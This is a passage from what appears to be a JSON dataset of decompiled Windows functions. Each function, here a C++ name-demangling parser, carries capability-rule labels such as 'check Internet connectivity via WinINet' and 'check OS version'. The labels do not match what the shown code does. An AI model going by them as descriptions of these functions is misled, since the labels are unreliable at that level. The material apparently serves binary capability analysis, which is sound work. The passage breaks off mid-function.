        "decompiled_code": "\nint32_t ** fcn.140007540(int64_t arg1, int32_t **arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int64_t arg4;\n    char *arg1_00;\n    uint64_t arg2_00;\n    int32_t **ppiVar5;\n    char cVar6;\n    \n    arg1_00 = *(arg1 + 0x18);\n    cVar6 = *arg1_00;\n    ppiVar5 = arg2;\n    do {\n        iVar3 = fcn.140004cc0(arg1_00);\n        if (iVar3 == 0) {\n            if (((arg3 & 1) == 0) && (cVar6 == 'F')) {\n                while (ppiVar5 != arg2) {\n                    piVar4 = *arg2;\n                    iVar3 = *piVar4;\n                    if (iVar3 == 0x1a) {\n                        *piVar4 = 0x1d;\n                    }\n                    else if (iVar3 == 0x1b) {\n                        *piVar4 = 0x1e;\n                    }\n                    else if (iVar3 == 0x19) {\n                        *piVar4 = 0x1c;\n                    }\n                    arg2 = piVar4 + 4;\n                }\n            }\n            return ppiVar5;\n        }\n        *(arg1 + 0x18) = arg1_00 + 1;\n        if (cVar6 == 'r') {\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 9;\n            arg2_00 = (-(arg3 == 0) & 0xfffffffd) + 0x1c;\n            arg4 = 0;\n        }\n        else if (cVar6 == 'V') {\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 9;\n            arg2_00 = (-(arg3 == 0) & 0xfffffffd) + 0x1d;\n            arg4 = 0;\n        }\n        else if (cVar6 == 'K') {\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 6;\n            arg2_00 = (-(arg3 == 0) & 0xfffffffd) + 0x1e;\n            arg4 = 0;\n        }\n        else {\n            if (arg1_00[1] == '\\0') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = arg1_00 + 2;\n            uVar1 = arg1_00[1];\n            if (uVar1 == 0x78) {\n                *(arg1 + 0x48) = *(arg1 + 0x48) + 0x11;\n                arg4 = 0;\n                arg2_00 = 0x4e;\n            }\n            else if ((uVar1 & 0xdf) == 0x4f) {\n                *(arg1 + 0x48) = *(arg1 + 0x48) + 9;\n                arg4 = 0;\n                arg2_00 = 0x50;\n                if (uVar1 == 0x4f) {\n                    uVar2 = *(arg1 + 0x4c);\n                    *(arg1 + 0x4c) = 1;\n                    arg4 = fcn.140006cb0(arg1);\n                    *(arg1 + 0x4c) = uVar2;\n                    if (arg4 == 0) {\n                        return NULL;\n                    }\n                    if (**(arg1 + 0x18) != 'E') {\n                        return NULL;\n                    }\n                    arg2_00 = 0x50;\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                }\n            }\n            else {\n                if (uVar1 != 0x77) {\n                    return NULL;\n                }\n                *(arg1 + 0x48) = *(arg1 + 0x48) + 6;\n                arg4 = fcn.140005ee0(arg1);\n                if (arg4 == 0) {\n                    return NULL;\n                }\n                if (**(arg1 + 0x18) != 'E') {\n                    return NULL;\n                }\n                arg2_00 = 0x51;\n                *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            }\n        }\n        piVar4 = fcn.140004740(arg1, arg2_00, 0, arg4);\n        *ppiVar5 = piVar4;\n        if (piVar4 == NULL) {\n            return NULL;\n        }\n        arg1_00 = *(arg1 + 0x18);\n        ppiVar5 = piVar4 + 4;\n        cVar6 = *arg1_00;\n    } while( true );\n}\n",
        "token_count": 1119
    },
    "14000778": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t * fcn.140007780(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t *puVar8;\n    uint *arg4;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint64_t arg3;\n    uint64_t uVar11;\n    char *arg2;\n    \n    iVar6 = *(arg1 + 0x48);\n    *(arg1 + 0x48) = iVar6 + 0x14;\n    pcVar3 = *(arg1 + 0x18);\n    if (*pcVar3 == 'T') {\n        *(arg1 + 0x18) = pcVar3 + 1;\n        if (pcVar3[1] == '\\0') {\ncode_r0x000140007922:\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar3 + 2;\n        if (0x35 < pcVar3[1] + 0xbfU) {\n            return NULL;\n        }\n    // switch table (54 cases) at 0x1400ff394\n        switch(*((pcVar3[1] + 0xbfU) * 4 + 0x1400ff394) + 0x1400ff394) {\n        case 0x140007922:\n            goto code_r0x000140007922;\n        case 0x140007aaa:\n            arg4 = fcn.140005410(arg1);\n            puVar9 = NULL;\n            uVar10 = 0xc;\n            break;\n        case 0x140007ac2:\n            arg4 = fcn.140005410(arg1);\n            puVar9 = NULL;\n            uVar10 = 0xe;\n            break;\n        case 0x140007ada:\n            puVar9 = fcn.140005410(arg1);\n            iVar6 = fcn.1400048a0(arg1);\n            if (iVar6 < 0) {\n                return NULL;\n            }\n            if (**(arg1 + 0x18) != '_') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            arg4 = fcn.140005410(arg1);\n            *(arg1 + 0x48) = *(arg1 + 0x48) + 5;\n            uVar10 = 0xb;\n            break;\n        case 0x140007b26:\n            arg4 = fcn.140007d80(arg1);\n            puVar9 = NULL;\n            uVar10 = 0x14;\n            break;\n        case 0x140007b3e:\n            arg4 = fcn.140006980(arg1);\n            puVar9 = NULL;\n            uVar10 = 0x30;\n            break;\n        case 0x140007b56:\n            iVar6 = fcn.140004960(arg1, 0x76);\n            if (iVar6 == 0) {\n                return NULL;\n            }\n            if ((**(arg1 + 0x18) == 'G') || (**(arg1 + 0x18) == 'T')) {\n                arg4 = fcn.140007780(arg1);\n            }\n            else {\n                arg4 = fcn.1400081f0(arg1, 0);\n            }\n            puVar9 = NULL;\n            uVar10 = 0x10;\n            break;\n        case 0x140007b9c:\n            iVar6 = fcn.140004960(arg1, 0x68);\n            if (iVar6 == 0) {\n                return NULL;\n            }\n            if ((**(arg1 + 0x18) == 'G') || (**(arg1 + 0x18) == 'T')) {\n                arg4 = fcn.140007780(arg1);\n            }\n            else {\n                arg4 = fcn.1400081f0(arg1, 0);\n            }\n            puVar9 = NULL;\n            uVar10 = 0xf;\n            break;\n        case 0x140007be2:\n            iVar6 = fcn.140004960(arg1, 0);\n            if (iVar6 == 0) {\n                return NULL;\n            }\n            iVar6 = fcn.140004960(arg1, 0);\n            if (iVar6 == 0) {\n                return NULL;\n            }\n            if ((**(arg1 + 0x18) == 'G') || (**(arg1 + 0x18) == 'T')) {\n                arg4 = fcn.140007780(arg1);\n            }\n            else {\n                arg4 = fcn.1400081f0(arg1, 0);\n            }\n            puVar9 = NULL;\n            uVar10 = 0x11;\n            break;\n        case 0x140007c37:\n            arg4 = fcn.140007d80(arg1);\n            puVar9 = NULL;\n            uVar10 = 0x15;\n            break;\n        case 0x140007c4f:\n            *(arg1 + 0x48) = iVar6 + 0xf;\n            arg4 = fcn.140005410(arg1);\n            puVar9 = NULL;\n            uVar10 = 9;\n            break;\n        case 0x140007c6d:\n            *(arg1 + 0x48) = iVar6 + 10;\n            arg4 = fcn.140005410(arg1);\n            puVar9 = NULL;\n            uVar10 = 10;\n            break;\n        case 0x140007c8b:\n            arg4 = fcn.140005410(arg1);\n            puVar9 = NULL;\n            uVar10 = 0xd;\n            break;\n        case 0x140007ca3:\n            arg4 = fcn.140005410(arg1);\n            puVar9 = NULL;\n            uVar10 = 0x12;\n        }\n    }\n    else {\n        if (*pcVar3 != 'G') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar3 + 1;\n        if (pcVar3[1] == '\\0') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar3 + 2;\n        cVar1 = pcVar3[1];\n        if (cVar1 == 'T') {\n            if (pcVar3[2] == '\\0') {\ncode_r0x000140007cd0:\n                arg4 = fcn.1400081f0(arg1, 0);\n            }\n            else {\n                *(arg1 + 0x18) = pcVar3 + 3;\n                cVar1 = pcVar3[3];\n                if (pcVar3[2] == 'n') {\n                    if ((cVar1 == 'G') || (cVar1 == 'T')) {\n                        arg4 = fcn.140007780(arg1);\n                    }\n                    else {\n                        arg4 = fcn.1400081f0(arg1, 0);\n                    }\n                    puVar9 = NULL;\n                    uVar10 = 0x4b;\n                    goto code_r0x00014000798a;\n                }\n                if ((cVar1 != 'G') && (cVar1 != 'T')) goto code_r0x000140007cd0;\n                arg4 = fcn.140007780(arg1);\n            }\n            puVar9 = NULL;\n            uVar10 = 0x4a;\n        }\n        else if (cVar1 < 'U') {\n            if (cVar1 == 'A') {\n                if ((pcVar3[2] == 'G') || (pcVar3[2] == 'T')) {\n                    arg4 = fcn.140007780(arg1);\n                }\n                else {\n                    arg4 = fcn.1400081f0(arg1, 0);\n                }\n                puVar9 = NULL;\n                uVar10 = 0x17;\n            }\n            else {\n                if (cVar1 != 'R') {\n                    return NULL;\n                }\n                arg4 = fcn.140007d80(arg1);\n                iVar6 = *(arg1 + 0x28);\n                if (iVar6 < *(arg1 + 0x2c)) {\n                    puVar9 = iVar6 * 0x20 + *(arg1 + 0x20);\n                    *(puVar9 + 1) = 0;\n                    *(arg1 + 0x28) = iVar6 + 1;\n                    *puVar9 = 0x43;\n                    uVar7 = fcn.1400048a0(arg1);\n                    puVar9[4] = uVar7;\n                }\n                else {\n                    puVar9 = NULL;\n                }\n                uVar10 = 0x16;\n            }\n        }\n        else {\n            if (cVar1 != 'V') {\n                if (cVar1 != 'r') {\n                    return NULL;\n                }\n                iVar6 = fcn.1400048a0(arg1);\n                if (iVar6 < 2) {\n                    return NULL;\n                }\n                pcVar3 = *(arg1 + 0x18);\n                if (*pcVar3 == '\\0') {\n                    return NULL;\n                }\n                arg2 = pcVar3 + 1;\n                *(arg1 + 0x18) = arg2;\n                if (*pcVar3 != '_') {\n                    return NULL;\n                }\n                iVar6 = iVar6 + -1;\n                if (pcVar3[1] == '\\0') {\n                    return NULL;\n                }\n                if (pcVar3[1] != '$') {\n                    puVar9 = NULL;\n                    goto code_r0x0001400078d6;\n                }\n                puVar9 = NULL;\n                do {\n                    cVar1 = arg2[1];\n                    if (cVar1 == 'S') {\n                        uVar7 = 0x2f;\n                    }\n                    else if (cVar1 == '_') {\n                        uVar7 = 0x2e;\n                    }\n                    else {\n                        uVar7 = 0x24;\n                        if (cVar1 != '$') {\n                            return NULL;\n                        }\n                    }\n                    iVar2 = *(arg1 + 0x28);\n                    arg2 = *(arg1 + 0x18) + 2;\n                    if (*(arg1 + 0x2c) <= iVar2) {\n                        *(arg1 + 0x18) = arg2;\n                        return NULL;\n                    }\n                    iVar6 = iVar6 + -2;\n                    arg4 = iVar2 * 0x20 + *(arg1 + 0x20);\n                    *(arg4 + 1) = 0;\n                    *(arg1 + 0x28) = iVar2 + 1;\n                    *arg4 = 0x42;\n                    arg4[4] = uVar7;\n                    *(arg1 + 0x18) = arg2;\n                    while( true ) {\n                        if ((puVar9 != NULL) && (arg4 = fcn.140004740(arg1, 0x41, puVar9, arg4),  arg4 == NULL)) {\n                            return NULL;\n                        }\n                        if (iVar6 < 1) {\n                            puVar9 = NULL;\n                            uVar10 = 0x40;\n                            goto code_r0x00014000798a;\n                        }\n                        if (*arg2 == '\\0') {\n                            return NULL;\n                        }\n                        puVar9 = arg4;\n                        if (*arg2 == '$') break;\ncode_r0x0001400078d6:\n                        uVar11 = 0;\n                        do {\n                            uVar10 = uVar11;\n                            if ((arg2[uVar11] == '\\0') || (arg2[uVar11] == '$')) {\n                                arg3 = uVar11 & 0xffffffff;\n                                goto code_r0x000140007903;\n                            }\n                            uVar11 = uVar11 + 1;\n                        } while (uVar11 != iVar6);\n                        uVar10 = uVar10 + 1;\n                        arg3 = uVar10;\n                        uVar11 = uVar10;\ncode_r0x000140007903:\n                        iVar6 = iVar6 - uVar10;\n                        arg4 = fcn.140004840(arg1, arg2, arg3);\n                        arg2 = *(arg1 + 0x18) + uVar11;\n                        *(arg1 + 0x18) = arg2;\n                        if (arg4 == NULL) {\n                            return NULL;\n                        }\n                    }\n                } while( true );\n            }\n            arg4 = fcn.140007d80(arg1);\n            puVar9 = NULL;\n            uVar10 = 0x13;\n        }\n    }\ncode_r0x00014000798a:\n    puVar4 = puVar9;\n    puVar5 = arg4;\n    if (uVar10 < 0x32) {\n        if (0x28 < uVar10) {\n            switch(uVar10) {\n            case 0x29:\n            case 0x2e:\n            case 0x2f:\n                goto code_r0x000140004778;\n            case 0x2b:\n            case 0x2d:\ncode_r0x00014000481f:\n                if (arg4 == NULL) {\n                    return NULL;\n                }\n            case 0x2a:\n            case 0x31:\njoined_r0x0001400047d3:\n                puVar5 = puVar4;\n                break;\n            default:\n                goto code_r0x0001400047d7;\n            case 0x30:\n                break;\n            }\n            goto joined_r0x000140004771;\n        }\n        uVar11 = 1 << (uVar10 & 0x3f);\n        if ((uVar11 & 0x17c00fff600) != 0) goto joined_r0x000140004771;\n        if ((uVar11 & 0x1fe000000) == 0) {\n            if ((uVar11 & 0x20000081e) == 0) {\n                return NULL;\n            }\n            goto code_r0x00014000481f;\n        }\n    }\n    else {\n        if (0x1d < uVar10 - 0x34) {\n            return NULL;\n        }\n        uVar11 = 1 << (uVar10 - 0x34 & 0x3f);\n        if ((uVar11 & 0x1c71107) == 0) {\n            if ((uVar11 & 0xa002ef8) != 0) goto code_r0x00014000481f;\n            puVar4 = uVar11 & 0x34000000;\n            goto joined_r0x0001400047d3;\n        }\njoined_r0x000140004771:\n        if (puVar5 == NULL) {\n            return NULL;\n        }\n    }\ncode_r0x000140004778:\n    iVar6 = *(arg1 + 0x28);\n    if (iVar6 < *(arg1 + 0x2c)) {\n        puVar8 = iVar6 * 0x20 + *(arg1 + 0x20);\n        *(puVar8 + 1) = 0;\n        *(arg1 + 0x28) = iVar6 + 1;\n        *puVar8 = uVar10;\n        *(puVar8 + 4) = arg4;\n        *(puVar8 + 6) = puVar9;\n        return puVar8;\n    }\ncode_r0x0001400047d7:\n    return NULL;\n}\n",
        "token_count": 3461
    },
    "140007d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t * fcn.140007d80(int64_t arg1)\n\n{\n    uint uVar1;\n    uint32_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    uint32_t *puVar7;\n    ulong arg4;\n    uint32_t *puVar8;\n    ulong uVar9;\n    int64_t *piVar10;\n    int64_t iVar11;\n    char *pcVar12;\n    uint32_t *puVar13;\n    int32_t *piVar14;\n    char *pcVar15;\n    char *pcVar16;\n    uint *arg3;\n    uint32_t *apuStack48 [2];\n    \n    pcVar12 = *(arg1 + 0x18);\n    cVar3 = *pcVar12;\n    if (cVar3 == 'U') {\n        pcVar12 = *(arg1 + 0x18);\n        cVar3 = *pcVar12;\n        if (cVar3 - 0x30U < 10) {\n            puVar8 = fcn.1400050c0(arg1);\n            cVar3 = **(arg1 + 0x18);\n            pcVar15 = *(arg1 + 0x18);\n            goto joined_r0x0001400063f5;\n        }\n        if (cVar3 + 0x9fU < 0x1a) {\n            uVar1 = *(arg1 + 0x4c);\n            if ((cVar3 == 'o') && (pcVar12[1] == 'n')) {\n                *(arg1 + 0x4c) = 0;\n                *(arg1 + 0x18) = pcVar12 + 2;\n            }\n            puVar8 = fcn.1400060f0(arg1);\n            *(arg1 + 0x4c) = uVar1;\n            if ((puVar8 != NULL) && (*puVar8 == 0x32)) {\n                pcVar12 = **(puVar8 + 4);\n                *(arg1 + 0x48) = *(arg1 + 0x48) + 7 + *(*(puVar8 + 4) + 2);\n                if ((*pcVar12 == 'l') && ((pcVar12[1] == 'i' && (pcVar12[2] == '\\0')))) {\n                    uVar9 = fcn.1400050c0(arg1);\n                    puVar8 = fcn.140004740(arg1, 0x37, puVar8, uVar9);\n                }\n            }\ncode_r0x0001400062dc:\n            cVar3 = **(arg1 + 0x18);\n            pcVar15 = *(arg1 + 0x18);\n            goto joined_r0x0001400063f5;\n        }\n        if (cVar3 + 0xbdU < 2) {\n            piVar14 = *(arg1 + 0x40);\n            if ((piVar14 == NULL) || ((*piVar14 != 0 && (*piVar14 != 0x18)))) {\n                if (cVar3 != 'C') goto code_r0x00014000650d;\n            }\n            else {\n                *(arg1 + 0x48) = piVar14[6] + *(arg1 + 0x48);\n                cVar3 = *pcVar12;\n                if (cVar3 != 'C') {\n                    if (cVar3 != 'D') {\ncode_r0x00014000654d:\n                        puVar8 = NULL;\n                        pcVar15 = pcVar12;\n                        goto joined_r0x0001400063f5;\n                    }\ncode_r0x00014000650d:\n                    if (pcVar12[1] - 0x30U < 6) {\n                        switch(*((pcVar12[1] - 0x30U) * 4 + 0x1400ff23c) + 0x1400ff23c) {\n                        case 0x140006554:\n                            uVar5 = 2;\n                            break;\n                        case 0x1400065b0:\n                            uVar5 = 5;\n                            break;\n                        case 0x1400065b7:\n                            uVar5 = 4;\n                            break;\n                        case 0x1400065be:\n                            uVar5 = 3;\n                            break;\n                        case 0x1400065c5:\n                            uVar5 = 1;\n                            break;\n                        case 0x1400065cc:\n                            goto code_r0x0001400065cc;\n                        }\n                        pcVar15 = pcVar12 + 2;\n                        iVar4 = *(arg1 + 0x28);\n                        *(arg1 + 0x18) = pcVar15;\n                        if (iVar4 < *(arg1 + 0x2c)) {\n                            puVar8 = iVar4 * 0x20 + *(arg1 + 0x20);\n                            *(puVar8 + 1) = 0;\n                            *(arg1 + 0x28) = iVar4 + 1;\n                            if (piVar14 != NULL) {\n                                *(puVar8 + 1) = 0;\n                                *puVar8 = 8;\n                                puVar8[4] = uVar5;\n                                *(puVar8 + 6) = piVar14;\n                                cVar3 = pcVar12[2];\n                                goto joined_r0x0001400063f5;\n                            }\n                        }\n                        cVar3 = pcVar12[2];\n                        puVar8 = NULL;\n                    }\n                    else {\ncode_r0x0001400065cc:\n                        puVar8 = NULL;\n                        pcVar15 = pcVar12;\n                    }\n                    goto joined_r0x0001400063f5;\n                }\n            }\n            cVar3 = pcVar12[1];\n            if (cVar3 == 'I') {\n                pcVar15 = pcVar12 + 1;\n                *(arg1 + 0x18) = pcVar15;\n                cVar3 = pcVar12[2];\n                if (4 < cVar3 - 0x31U) {\n                    cVar3 = pcVar12[1];\n                    puVar8 = NULL;\n                    goto joined_r0x0001400063f5;\n                }\n                *(arg1 + 0x18) = pcVar12 + 3;\n                fcn.140005410(arg1);\n                piVar14 = *(arg1 + 0x40);\n                pcVar15 = *(arg1 + 0x18);\n            }\n            else {\n                if (4 < cVar3 - 0x31U) {\n                    return NULL;\n                }\n                pcVar15 = pcVar12 + 2;\n                *(arg1 + 0x18) = pcVar15;\n            }\n            iVar4 = *(arg1 + 0x28);\n            if (iVar4 < *(arg1 + 0x2c)) {\n                puVar8 = iVar4 * 0x20 + *(arg1 + 0x20);\n                *(puVar8 + 1) = 0;\n                *(arg1 + 0x28) = iVar4 + 1;\n                if (piVar14 != NULL) {\n                    *(puVar8 + 1) = 0;\n                    *puVar8 = 7;\n                    puVar8[4] = cVar3 - 0x30;\n                    *(puVar8 + 6) = piVar14;\n                    cVar3 = *pcVar15;\n                    goto joined_r0x0001400063f5;\n                }\n            }\n        }\n        else {\n            if (cVar3 == 'L') {\n                *(arg1 + 0x18) = pcVar12 + 1;\n                puVar8 = fcn.1400050c0(arg1);\n                if (puVar8 == NULL) {\n                    return NULL;\n                }\n                iVar4 = fcn.140004a40(arg1);\n                if (iVar4 == 0) {\n                    return NULL;\n                }\n                goto code_r0x0001400062dc;\n            }\n            if (cVar3 != 'U') {\n                return NULL;\n            }\n            if (pcVar12[1] == 'l') {\n                *(arg1 + 0x18) = pcVar12 + 1;\n                cVar3 = pcVar12[1];\n                if (cVar3 != 'l') goto code_r0x0001400066a0;\n                *(arg1 + 0x18) = pcVar12 + 2;\n                iVar11 = fcn.140005ee0(arg1);\n                pcVar12 = *(arg1 + 0x18);\n                cVar3 = *pcVar12;\n                if ((iVar11 == 0) || (cVar3 != 'E')) goto code_r0x00014000654d;\n                pcVar16 = pcVar12 + 1;\n                *(arg1 + 0x18) = pcVar16;\n                if (pcVar12[1] == '_') {\n                    uVar5 = 0;\n                }\n                else {\n                    if (pcVar12[1] == 'n') {\n                        return NULL;\n                    }\n                    iVar4 = fcn.1400048a0(arg1);\n                    uVar5 = iVar4 + 1;\n                    if (uVar5 < 0) goto code_r0x000140006761;\n                    pcVar16 = *(arg1 + 0x18);\n                    cVar3 = *pcVar16;\n                    if (cVar3 != '_') goto code_r0x00014000678b;\n                }\n                pcVar15 = pcVar16 + 1;\n                iVar4 = *(arg1 + 0x28);\n                *(arg1 + 0x18) = pcVar15;\n                if (iVar4 < *(arg1 + 0x2c)) {\n                    puVar8 = iVar4 * 0x20 + *(arg1 + 0x20);\n                    *(puVar8 + 1) = 0;\n                    *(arg1 + 0x28) = iVar4 + 1;\n                    *puVar8 = 0x47;\n                    *(puVar8 + 4) = iVar11;\n                    puVar8[6] = uVar5;\n                    cVar3 = pcVar16[1];\n                    goto joined_r0x0001400063f5;\n                }\ncode_r0x000140006747:\n                cVar3 = pcVar16[1];\n                puVar8 = NULL;\n                goto joined_r0x0001400063f5;\n            }\n            if (pcVar12[1] != 't') {\n                return NULL;\n            }\n            *(arg1 + 0x18) = pcVar12 + 1;\n            cVar3 = pcVar12[1];\n            if (cVar3 != 't') {\ncode_r0x0001400066a0:\n                puVar8 = NULL;\n                pcVar15 = pcVar12 + 1;\n                goto joined_r0x0001400063f5;\n            }\n            pcVar16 = pcVar12 + 2;\n            *(arg1 + 0x18) = pcVar16;\n            if (pcVar12[2] == '_') {\n                uVar5 = 0;\ncode_r0x000140006383:\n                pcVar15 = pcVar16 + 1;\n                iVar4 = *(arg1 + 0x28);\n                *(arg1 + 0x18) = pcVar15;\n                if (iVar4 < *(arg1 + 0x2c)) {\n                    puVar8 = iVar4 * 0x20 + *(arg1 + 0x20);\n                    *(puVar8 + 1) = 0;\n                    *(arg1 + 0x28) = iVar4 + 1;\n                    puVar8[4] = uVar5;\n                    iVar4 = *(arg1 + 0x38);\n                    *puVar8 = 0x49;\n                    if (iVar4 < *(arg1 + 0x3c)) {\n                        *(*(arg1 + 0x30) + iVar4 * 8) = puVar8;\n                        *(arg1 + 0x38) = iVar4 + 1;\n                        cVar3 = pcVar16[1];\n                        goto joined_r0x0001400063f5;\n                    }\n                }\n                goto code_r0x000140006747;\n            }\n            if (pcVar12[2] == 'n') {\n                return NULL;\n            }\n            iVar4 = fcn.1400048a0(arg1);\n            uVar5 = iVar4 + 1;\n            if (-1 < uVar5) {\n                pcVar16 = *(arg1 + 0x18);\n                cVar3 = *pcVar16;\n                if (cVar3 != '_') {\ncode_r0x00014000678b:\n                    puVar8 = NULL;\n                    pcVar15 = pcVar16;\n                    goto joined_r0x0001400063f5;\n                }\n                goto code_r0x000140006383;\n            }\ncode_r0x000140006761:\n            pcVar15 = *(arg1 + 0x18);\n        }\n        cVar3 = *pcVar15;\n        puVar8 = NULL;\njoined_r0x0001400063f5:\n        if (cVar3 == 'B') {\n            uVar9 = *(arg1 + 0x40);\n            do {\n                *(arg1 + 0x18) = pcVar15 + 1;\n                arg4 = fcn.1400050c0(arg1);\n                puVar8 = fcn.140004740(arg1, 0x4d, puVar8, arg4);\n                pcVar15 = *(arg1 + 0x18);\n            } while (*pcVar15 == 'B');\n            *(arg1 + 0x40) = uVar9;\n            return puVar8;\n        }\n        return puVar8;\n    }\n    if (cVar3 < 'V') {\n        if (cVar3 == 'N') {\n            *(arg1 + 0x18) = pcVar12 + 1;\n            piVar10 = fcn.140007540(arg1, apuStack48, 1);\n            if (piVar10 == NULL) {\n                return NULL;\n            }\n            puVar8 = fcn.1400049e0(arg1, 0);\n            iVar11 = fcn.140006ad0(arg1, 1);\n            *piVar10 = iVar11;\n            if (iVar11 != 0) {\n                if (puVar8 != NULL) {\n                    *(puVar8 + 4) = apuStack48[0];\n                    apuStack48[0] = puVar8;\n                }\n                if (**(arg1 + 0x18) == 'E') {\n                    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                    return apuStack48[0];\n                }\n                return NULL;\n            }\n            return NULL;\n        }\n        if (cVar3 == 'S') {\n            if (pcVar12[1] == 't') {\n                *(arg1 + 0x18) = pcVar12 + 2;\n                uVar9 = fcn.140006290(arg1);\n                iVar4 = *(arg1 + 0x28);\n                if (iVar4 < *(arg1 + 0x2c)) {\n                    arg3 = iVar4 * 0x20 + *(arg1 + 0x20);\n                    *(arg1 + 0x28) = iVar4 + 1;\n                    *(arg3 + 1) = 0;\n                    *arg3 = 0;\n                    *(arg3 + 4) = 0x1400ff47b;\n                    arg3[6] = 3;\n                }\n                else {\n                    arg3 = NULL;\n                }\n                puVar8 = fcn.140004740(arg1, 1, arg3, uVar9);\n                *(arg1 + 0x48) = *(arg1 + 0x48) + 3;\n                pcVar12 = *(arg1 + 0x18);\n                if (*pcVar12 != 'I') {\n                    return puVar8;\n                }\n                if (puVar8 == NULL) {\n                    return NULL;\n                }\n                iVar4 = *(arg1 + 0x38);\n                if (*(arg1 + 0x3c) <= iVar4) {\n                    return NULL;\n                }\n                *(*(arg1 + 0x30) + iVar4 * 8) = puVar8;\n                *(arg1 + 0x38) = iVar4 + 1;\n                if (1 < *pcVar12 + 0xb7U) {\n                    puVar13 = NULL;\n                    goto code_r0x000140008073;\n                }\n            }\n            else {\n                puVar8 = fcn.1400051c0(arg1, 0);\n                pcVar12 = *(arg1 + 0x18);\n                if (*pcVar12 != 'I') {\n                    return puVar8;\n                }\n            }\n            *(arg1 + 0x18) = pcVar12 + 1;\n            puVar13 = fcn.140006a20(arg1);\n        }\n        else {\ncode_r0x000140007e90:\n            puVar8 = fcn.140006290(arg1);\n            pcVar12 = *(arg1 + 0x18);\n            if (*pcVar12 != 'I') {\n                return puVar8;\n            }\n            if ((puVar8 == NULL) || (iVar4 = *(arg1 + 0x38),  *(arg1 + 0x3c) <= iVar4)) {\n                return NULL;\n            }\n            puVar13 = NULL;\n            *(*(arg1 + 0x30) + iVar4 * 8) = puVar8;\n            *(arg1 + 0x38) = iVar4 + 1;\n            if (*pcVar12 + 0xb7U < 2) {\n                *(arg1 + 0x18) = pcVar12 + 1;\n                puVar13 = fcn.140006a20(arg1);\n            }\n        }\ncode_r0x000140008073:\n        uVar5 = 4;\n    }\n    else {\n        if (cVar3 != 'Z') goto code_r0x000140007e90;\n        *(arg1 + 0x18) = pcVar12 + 1;\n        if ((pcVar12[1] == 'G') || (pcVar12[1] == 'T')) {\n            puVar8 = fcn.140007780(arg1);\n        }\n        else {\n            puVar8 = fcn.1400081f0(arg1, 0);\n        }\n        if (puVar8 == NULL) {\n            return NULL;\n        }\n        pcVar12 = *(arg1 + 0x18);\n        if (*pcVar12 != 'E') {\n            return NULL;\n        }\n        *(arg1 + 0x18) = pcVar12 + 1;\n        if (pcVar12[1] == 's') {\n            *(arg1 + 0x18) = pcVar12 + 2;\n            iVar4 = fcn.140004a40(arg1);\n            if (iVar4 == 0) {\n                return NULL;\n            }\n            iVar4 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar4) goto code_r0x000140008150;\n            *(arg1 + 0x28) = iVar4 + 1;\n            puVar13 = iVar4 * 0x20 + *(arg1 + 0x20);\n            *(puVar13 + 1) = 0;\n            *puVar13 = 0;\n            *(puVar13 + 4) = \"string literal\";\n            puVar13[6] = 0xe;\n        }\n        else if (pcVar12[1] == 'd') {\n            pcVar15 = pcVar12 + 2;\n            *(arg1 + 0x18) = pcVar15;\n            if (pcVar12[2] == '_') {\n                uVar5 = 0;\n            }\n            else {\n                if (pcVar12[2] == 'n') {\n                    return NULL;\n                }\n                iVar4 = fcn.1400048a0(arg1);\n                uVar5 = iVar4 + 1;\n                if (uVar5 < 0) {\n                    return NULL;\n                }\n                pcVar15 = *(arg1 + 0x18);\n                if (*pcVar15 != '_') {\n                    return NULL;\n                }\n            }\n            *(arg1 + 0x18) = pcVar15 + 1;\n            piVar14 = fcn.140007d80(arg1);\n            if (((piVar14 != NULL) && ((*piVar14 - 0x47U & 0xfffffffd) != 0)) &&\n               (iVar4 = fcn.140004a40(arg1),  iVar4 == 0)) {\n                return NULL;\n            }\n            iVar4 = *(arg1 + 0x28);\n            if (*(arg1 + 0x2c) <= iVar4) goto code_r0x000140008150;\n            puVar13 = iVar4 * 0x20 + *(arg1 + 0x20);\n            *(puVar13 + 1) = 0;\n            *(arg1 + 0x28) = iVar4 + 1;\n            *puVar13 = 0x48;\n            puVar13[6] = uVar5;\n            *(puVar13 + 4) = piVar14;\n        }\n        else {\n            puVar13 = fcn.140007d80(arg1);\n            if (puVar13 == NULL) {\ncode_r0x000140008150:\n                puVar13 = NULL;\n            }\n            else if (((*puVar13 - 0x47 & 0xfffffffd) != 0) && (iVar4 = fcn.140004a40(arg1),  iVar4 == 0)) {\n                return NULL;\n            }\n        }\n        if ((*puVar8 == 3) && (**(puVar8 + 6) == 0x29)) {\n            *(*(puVar8 + 6) + 4) = 0;\n        }\n        uVar5 = 2;\n    }\n    puVar7 = puVar13;\n    puVar2 = puVar8;\n    if (uVar5 < 0x32) {\n        if (0x28 < uVar5) {\n            switch(uVar5) {\n            case 0x29:\n            case 0x2e:\n            case 0x2f:\n                goto code_r0x000140004778;\n            case 0x2b:\n            case 0x2d:\ncode_r0x00014000481f:\n                if (puVar8 == NULL) {\n                    return 